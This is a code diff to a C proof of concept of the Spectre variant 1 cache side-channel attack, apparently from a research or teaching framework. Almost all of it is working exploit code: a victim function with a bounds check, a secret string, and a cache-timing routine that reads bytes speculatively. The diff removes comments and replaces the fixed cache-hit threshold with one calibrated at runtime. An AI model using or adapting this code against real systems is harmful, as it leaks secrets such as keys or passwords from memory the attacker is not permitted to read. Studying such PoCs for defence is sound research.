@@ -4,9 +4,6 @@
 #include "../../util/util.h"
 #include "../../front/front.h"
 
-/********************************************************************
-Victim code.
-********************************************************************/
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
@@ -15,7 +12,7 @@ uint8_t array2[256 * 512];
 
 char* secret = "the secret word is: spaghetti\0";
 
-uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
+uint8_t temp = 0; 
 
 void victim_function(int x)
 {
@@ -27,13 +24,7 @@ void victim_function(int x)
 	}
 }
 
-/********************************************************************
-Analysis code
-********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
-
-/* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int malicious_x, uint8_t* value)
+void readMemoryByte(int malicious_x, uint8_t* value, int threshold)
 {
 	static int results[256];
 	int tries, i, j, k, mix_i;
@@ -97,11 +88,11 @@ void readMemoryByte(int malicious_x, uint8_t* value)
 		{
 			mix_i = ((i * 167) + 13) & 255;
 			addr = &array2[mix_i * 512];
-			time1 = read_timestamp(); // READ TIMER 
-			junk = *addr; // MEMORY ACCESS TO TIME 
-			time2 = read_timestamp() - time1; // READ TIMER & COMPUTE ELAPSED TIME 
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++; // cache hit - add +1 to score for this value 
+			time1 = read_timestamp();
+			junk = *addr;
+			time2 = read_timestamp() - time1;
+			if (time2 <= threshold && mix_i != array1[tries % array1_size])
+				results[mix_i]++; // cache hit  
 		}
 
 		j = -1;
@@ -119,13 +110,14 @@ void spectre()
 	int len = strlen(secret);
 	char output[len];
 	uint8_t value;
+	const int threshold = determine_threshold();
 
 	for (int i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; // write to array2 so in RAM not copy-on-write zero pages 
 
 	for (int i = 0; i < len; i++)
 	{
-		readMemoryByte(malicious_x++, &value);
+		readMemoryByte(malicious_x++, &value, threshold);
 		output[i] = value;
 	}
 
